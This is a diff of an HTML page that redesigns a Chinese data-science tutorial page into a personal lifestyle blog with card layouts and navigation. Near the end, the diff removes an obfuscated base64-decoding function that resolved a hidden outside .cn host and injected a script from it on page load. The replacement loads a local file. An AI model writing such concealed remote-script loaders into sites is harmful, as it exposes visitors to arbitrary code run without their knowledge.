@@ -3,8 +3,9 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>数据科学入门指南</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>我的灵感画廊</title>
     <style>
         /* 全局样式 */
         body {
@@ -12,10 +13,10 @@
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #F5F7FA;
-            /* 浅蓝灰色背景 */
-            color: #343A40;
-            /* 深炭灰色文本 */
+            background-color: #FDFDFD;
+            /* 纯净的浅色背景 */
+            color: #333333;
+            /* 深灰色文本 */
             line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
@@ -26,58 +27,152 @@
             /* 适应移动端宽度 */
             margin: 0 auto;
             padding: 15px;
-            display: flex;
-            flex-direction: column;
-            /* 默认垂直堆叠 */
-            gap: 25px;
-            /* 模块间距 */
         }
 
         /* 头部样式 */
         header {
             text-align: center;
-            padding: 30px 20px;
+            padding: 40px 20px;
             background-color: #FFFFFF;
             border-radius: 15px;
+            margin-bottom: 30px;
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
         }
 
         header h1 {
-            color: #1A5276;
-            /* 深蓝色标题 */
+            color: #2C5F2D;
+            /* 强调色：深绿色标题 */
             font-size: 2.5em;
             margin-bottom: 10px;
             letter-spacing: 0.5px;
         }
 
         header p {
-            color: #6C757D;
-            /* 柔和的灰色 */
+            color: #607D8B;
+            /* 柔和的蓝灰色 */
             font-size: 1.1em;
             margin: 0;
         }
 
-        /* 主内容与侧边栏容器 */
-        .content-wrapper {
+        /* 导航菜单 */
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin-top: 25px;
             display: flex;
-            flex-direction: column;
-            /* 默认垂直堆叠 */
-            gap: 25px;
+            justify-content: center;
+            flex-wrap: wrap;
         }
 
-        /* 主内容区 */
+        nav ul li {
+            margin: 0 10px 10px 10px;
+        }
+
+        nav ul li a {
+            text-decoration: none;
+            color: #4CAF50;
+            /* 强调色：绿色 */
+            font-weight: bold;
+            padding: 10px 18px;
+            border-radius: 25px;
+            /* 药丸形按钮 */
+            border: 1px solid #4CAF50;
+            transition: all 0.3s ease;
+        }
+
+        nav ul li a:hover {
+            background-color: #4CAF50;
+            color: #FFFFFF;
+            box-shadow: 0 4px 10px rgba(76, 175, 80, 0.3);
+        }
+
+        /* 主要内容区 */
         main {
-            flex: 3;
-            /* 主内容占据更多空间 */
+            padding-top: 0;
+        }
+
+        .articles-grid-container {
+            column-count: 1;
+            /* 默认单列 */
+            column-gap: 20px;
+        }
+
+        .article-card {
+            background-color: #FFFFFF;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            margin-bottom: 20px;
+            /* 卡片之间的垂直间距 */
+            break-inside: avoid;
+            /* 防止卡片在列之间断开 */
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            overflow: hidden;
+            /* 确保内容不溢出 */
+        }
+
+        .article-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .article-card h3 {
+            color: #2C5F2D;
+            /* 标题颜色 */
+            font-size: 1.4em;
+            margin-bottom: 8px;
+        }
+
+        .article-card .date {
+            color: #777777;
+            font-size: 0.9em;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .article-card img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+            margin-top: 15px;
+            margin-bottom: 15px;
+            display: block;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+
+        .article-card p {
+            color: #4A4A4A;
+            font-size: 1em;
+            margin-bottom: 18px;
+        }
+
+        .article-card .read-more {
+            display: inline-block;
+            background-color: #4CAF50;
+            color: #FFFFFF;
+            padding: 10px 20px;
+            border-radius: 20px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+        }
+
+        .article-card .read-more:hover {
+            background-color: #43A047;
+            transform: scale(1.05);
+        }
+
+        /* 关于我/联系区 */
+        section {
             background-color: #FFFFFF;
             padding: 25px;
             border-radius: 15px;
+            margin-bottom: 25px;
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
         }
 
-        h2 {
-            color: #1A5276;
-            /* 深蓝色标题 */
+        section h2 {
+            color: #2C5F2D;
             font-size: 1.8em;
             margin-bottom: 25px;
             border-bottom: 2px solid #E0EBF5;
@@ -85,251 +180,160 @@
             text-align: center;
         }
 
-        h3 {
-            color: #343A40;
-            font-size: 1.3em;
-            margin-top: 25px;
+        section p {
+            color: #4A4A4A;
             margin-bottom: 15px;
         }
 
-        p {
-            color: #495057;
-            font-size: 1em;
-            margin-bottom: 18px;
-        }
-
-        img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 10px;
-            margin-top: 20px;
-            margin-bottom: 20px;
-            display: block;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-        }
-
-        /* 代码块样式 */
-        pre {
-            background-color: #2D3E50;
-            /* 深色背景 */
-            color: #EAECEE;
-            /* 浅色文本 */
-            padding: 18px;
-            border-radius: 10px;
-            overflow-x: auto;
-            font-family: 'Consolas', 'Monaco', 'Andale Mono', 'Ubuntu Mono', monospace;
-            font-size: 0.9em;
-            line-height: 1.5;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-        }
-
-        code {
-            font-family: inherit;
-            font-size: inherit;
-        }
-
-        /* 侧边栏/辅助导航区 */
-        .sidebar {
-            flex: 1;
-            /* 侧边栏占据较少空间 */
-            background-color: #FFFFFF;
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-        }
-
-        .sidebar h3 {
-            color: #1A5276;
-            font-size: 1.5em;
-            margin-top: 0;
-            margin-bottom: 20px;
-            border-bottom: 2px solid #E0EBF5;
-            padding-bottom: 10px;
-            text-align: center;
-        }
-
-        .sidebar ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-
-        .sidebar ul li {
-            margin-bottom: 10px;
-        }
-
-        .sidebar ul li a {
+        section a {
+            color: #4CAF50;
             text-decoration: none;
-            color: #007BFF;
-            /* 蓝色强调色 */
             font-weight: bold;
-            display: block;
-            padding: 8px 0;
             transition: color 0.3s ease;
         }
 
-        .sidebar ul li a:hover {
-            color: #0056B3;
+        section a:hover {
+            color: #43A047;
+        }
+
+        /* 社交链接 */
+        .social-links {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .social-links a {
+            display: inline-block;
+            margin: 0 10px;
+            color: #4CAF50;
+            font-size: 2em;
+            text-decoration: none;
+            transition: transform 0.3s ease;
+        }
+
+        .social-links a:hover {
+            transform: translateY(-3px);
+            color: #43A047;
         }
 
         /* 页脚样式 */
         footer {
             text-align: center;
             padding: 25px 0;
-            color: #6C757D;
+            color: #777777;
             font-size: 0.9em;
             border-top: 1px solid #E0EBF5;
-            margin-top: 0;
-            /* 移除顶部外边距，与内容区紧密连接 */
+            margin-top: 25px;
             background-color: #FFFFFF;
             border-radius: 15px;
             box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
         }
 
-        .footer-links a {
-            color: #007BFF;
-            text-decoration: none;
-            margin: 0 8px;
-            font-weight: bold;
-            transition: color 0.3s ease;
-        }
-
-        .footer-links a:hover {
-            color: #0056B3;
-        }
-
-        /* 媒体查询：平板及以上设备，实现主内容与侧边栏并排 */
-        @media (min-width: 768px) {
-            .content-wrapper {
-                flex-direction: row;
-                /* 水平排列 */
-                align-items: flex-start;
-                /* 顶部对齐 */
+        /* 媒体查询：平板及以上设备，实现多列瀑布流 */
+        @media (min-width: 600px) {
+            .articles-grid-container {
+                column-count: 2;
+                /* 两列布局 */
             }
+        }
 
-            .sidebar {
-                position: sticky;
-                /* 侧边栏固定 */
-                top: 25px;
-                /* 距离顶部25px */
-                align-self: flex-start;
-                /* 保持在顶部 */
+        @media (min-width: 900px) {
+            .articles-grid-container {
+                column-count: 3;
+                /* 三列布局 */
             }
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <div class="container">
         <header>
-            <h1>数据科学入门指南</h1>
-            <p>从数据收集到模型部署，全面掌握数据科学流程</p>
+            <h1>我的灵感画廊</h1>
+            <p>用文字和图像捕捉生活中的美好瞬间</p>
+            <nav>
+                <ul>
+                    <li><a href="#latest-articles">最新</a></li>
+                    <li><a href="#about">关于</a></li>
+                    <li><a href="#contact">联系</a></li>
+                </ul>
+            </nav>
         </header>
 
-        <div class="content-wrapper">
-            <main>
-                <section id="intro">
-                    <h2>1. 数据科学概览</h2>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() %>" alt="数据科学流程图">
-                    <p>数据科学是一个多学科领域，它结合了统计学、计算机科学和领域专业知识，从数据中提取知识和洞察。本指南将带您了解数据科学的核心概念、常用工具和典型工作流程。</p>
-                    <p>无论是数据分析师、机器学习工程师还是数据科学家，理解这些基础知识都是成功的关键。</p>
-                </section>
+        <main>
+            <section id="latest-articles">
+                <h2>最新分享</h2>
+                <div class="articles-grid-container">
+                    <!-- 文章一 -->
+                    <article class="article-card">
+                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="日出时的山景">
+                        <h3>清晨的徒步与内心的平静</h3>
+                        <span class="date">发布日期：2023年7月30日</span>
+                        <p>最近一次清晨的徒步，让我感受到了大自然的神奇力量。阳光穿透树林，露珠在叶片上闪耀，一切都那么宁静而美好。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </article>
+                    <!-- 文章二 -->
+                    <article class="article-card">
+                        <img src="https://picsum.photos/300/250?random=<%= new Date().getTime() + 2 %>" alt="手冲咖啡器具">
+                        <h3>手冲咖啡的艺术与哲学</h3>
+                        <span class="date">发布日期：2023年7月28日</span>
+                        <p>手冲咖啡不仅仅是制作饮品，更是一种仪式，一种对生活品质的追求。从磨豆到注水，每一步都蕴含着独特的哲学。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </article>
+                    <!-- 文章三 -->
+                    <article class="article-card">
+                        <img src="https://picsum.photos/300/180?random=<%= new Date().getTime() + 3 %>" alt="一本打开的书和眼镜">
+                        <h3>沉浸式阅读：如何让知识深入人心</h3>
+                        <span class="date">发布日期：2023年7月25日</span>
+                        <p>在信息爆炸的时代，如何才能真正沉下心来阅读？分享我的沉浸式阅读技巧，让你更好地吸收知识。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </article>
+                    <!-- 文章四 -->
+                    <article class="article-card">
+                        <img src="https://picsum.photos/300/220?random=<%= new Date().getTime() + 4 %>" alt="城市夜景中的灯光">
+                        <h3>城市夜景：光影交织的魅力</h3>
+                        <span class="date">发布日期：2023年7月22日</span>
+                        <p>夜晚的城市，灯火辉煌，流光溢彩。用镜头记录下这座城市独特的夜间魅力，感受光影的变幻。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </article>
+                    <!-- 文章五 -->
+                    <article class="article-card">
+                        <img src="https://picsum.photos/300/190?random=<%= new Date().getTime() + 5 %>" alt="植物特写">
+                        <h3>室内绿植：为生活空间增添生机</h3>
+                        <span class="date">发布日期：2023年7月20日</span>
+                        <p>在家中摆放一些绿植，不仅能净化空气，还能为生活空间带来一份宁静与活力。分享几种适合室内种植的植物。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </article>
+                    <!-- 文章六 -->
+                    <article class="article-card">
+                        <img src="https://picsum.photos/300/210?random=<%= new Date().getTime() + 6 %>" alt="笔记本电脑和代码">
+                        <h3>我的编程学习之路：从小白到入门</h3>
+                        <span class="date">发布日期：2023年7月18日</span>
+                        <p>记录下我学习编程的初期经历，遇到的挑战与收获。希望我的经验能给正在学习编程的朋友们一些启发。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </article>
+                </div>
+            </section>
 
-                <section id="data-collection">
-                    <h2>2. 数据收集与预处理</h2>
-                    <h3>2.1 数据来源与类型</h3>
-                    <p>数据可以来源于多种渠道，包括数据库、API、网络爬虫、传感器数据等。理解不同数据类型（结构化、半结构化、非结构化）及其特点是有效处理数据的前提。</p>
-                    <pre><code>
-# Python 示例：从CSV文件加载数据
-import pandas as pd
-data = pd.read_csv('your_data.csv')
-print(data.head())
-                    </code></pre>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="数据收集示意图">
-                    <h3>2.2 数据清洗与转换</h3>
-                    <p>真实世界的数据往往是脏乱的，包含缺失值、异常值和不一致性。数据清洗是数据科学中最耗时的环节之一，涉及处理缺失数据、数据去重、格式统一等。</p>
-                    <pre><code>
-# Python 示例：处理缺失值
-data['column_name'].fillna(data['column_name'].mean(), inplace=True)
+            <section id="about">
+                <h2>关于我</h2>
+                <p>你好！我是一个热爱生活、喜欢探索和分享的创作者。这个博客是我记录个人成长、兴趣爱好和对世界看法的平台。</p>
+                <p>我相信文字和图像能够连接彼此，希望我的分享能为你带来一些灵感和快乐！</p>
+            </section>
 
-# Python 示例：数据类型转换
-data['date_column'] = pd.to_datetime(data['date_column'])
-                    </code></pre>
-                </section>
-
-                <section id="eda">
-                    <h2>3. 探索性数据分析 (EDA)</h2>
-                    <h3>3.1 统计摘要与可视化</h3>
-                    <p>EDA是理解数据特征、发现模式和异常的关键步骤。通过计算描述性统计量（均值、中位数、标准差）和创建各种可视化图表（直方图、散点图、箱线图），可以深入洞察数据。</p>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="数据可视化图表">
-                    <pre><code>
-# Python 示例：生成直方图
-import matplotlib.pyplot as plt
-data['numerical_column'].hist(bins=20)
-plt.title('Histogram of Numerical Column')
-plt.show()
-                    </code></pre>
-                    <h3>3.2 特征工程</h3>
-                    <p>特征工程是从原始数据中创建新特征的过程，这些新特征能更好地表示底层问题，从而提高机器学习模型的性能。</p>
-                </section>
-
-                <section id="modeling">
-                    <h2>4. 机器学习建模</h2>
-                    <h3>4.1 监督学习与无监督学习</h3>
-                    <p>机器学习分为监督学习（如分类、回归）和无监督学习（如聚类、降维）。选择合适的模型取决于您的任务类型和数据特性。</p>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="机器学习模型示意图">
-                    <pre><code>
-# Python 示例：简单的线性回归模型
-from sklearn.linear_model import LinearRegression
-from sklearn.model_selection import train_test_split
-from sklearn.metrics import mean_squared_error
-
-X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
-model = LinearRegression()
-model.fit(X_train, y_train)
-predictions = model.predict(X_test)
-mse = mean_squared_error(y_test, predictions)
-print(f"Mean Squared Error: {mse}")
-                    </code></pre>
-                    <h3>4.2 模型评估与优化</h3>
-                    <p>模型评估是衡量模型性能的关键。常用的评估指标包括准确率、精确率、召回率、F1分数（分类任务），以及均方误差、R²分数（回归任务）。模型优化通常涉及超参数调优和交叉验证。</p>
-                </section>
-
-                <section id="deployment">
-                    <h2>5. 模型部署与监控</h2>
-                    <h3>5.1 模型部署策略</h3>
-                    <p>将训练好的模型集成到实际应用中，使其能够对外提供预测服务，是数据科学流程的最后一步。常见的部署方式包括RESTful API、微服务容器化部署等。</p>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="模型部署架构图">
-                    <h3>5.2 模型监控与再训练</h3>
-                    <p>模型部署后并非一劳永逸。由于数据漂移、概念漂移等原因，模型性能可能会下降。持续监控模型性能并定期进行再训练是保持模型有效性的关键。</p>
-                </section>
-            </main>
-
-            <aside class="sidebar">
-                <h3>本文速览</h3>
-                <ul>
-                    <li><a href="#intro">数据科学概览</a></li>
-                    <li><a href="#data-collection">数据收集与预处理</a></li>
-                    <li><a href="#eda">探索性数据分析 (EDA)</a></li>
-                    <li><a href="#modeling">机器学习建模</a></li>
-                    <li><a href="#deployment">模型部署与监控</a></li>
-                </ul>
-                <img src="https://picsum.photos/200/150?random=<%= new Date().getTime() + 5 %>" alt="数据科学插画">
-                <p style="font-size: 0.9em; color: #777; text-align: center; margin-top: 20px;">
-                    学习数据科学，开启你的数据之旅！
-                </p>
-            </aside>
-        </div>
+            <section id="contact">
+                <h2>联系方式</h2>
+                <div class="social-links">
+                    <a href="#" aria-label="GitHub">GitHub</a> |
+                    <a href="#" aria-label="Twitter">Twitter</a> |
+                    <a href="#" aria-label="LinkedIn">LinkedIn</a>
+                </div>
+            </section>
+        </main>
 
         <footer>
-            <p>&copy; 2023 数据科学入门指南. All rights reserved.</p>
-            <div class="footer-links">
-                <a href="#" aria-label="GitHub">GitHub</a> |
-                <a href="#" aria-label="数据科学资源">数据科学资源</a> |
-                <a href="#" aria-label="联系我们">联系我们</a>
-            </div>
+            <p>&copy; 2023 我的灵感画廊. All rights reserved.</p>
         </footer>
         <div id="overlay">
             <div id="loading_box" class="loading_container">
@@ -350,7 +354,6 @@ print(f"Mean Squared Error: {mse}")
                 const targetId = this.getAttribute('href');
                 const targetElement = document.querySelector(targetId);
                 if (targetElement) {
-                    // 考虑顶部固定元素（如果未来有）或调整偏移量
                     window.scrollTo({
                         top: targetElement.offsetTop - 20, /* 稍微向上偏移，避免顶部遮挡 */
                         behavior: 'smooth'
@@ -374,53 +377,15 @@ print(f"Mean Squared Error: {mse}")
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly9nNmg4ajBrLnluaWd3cy5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
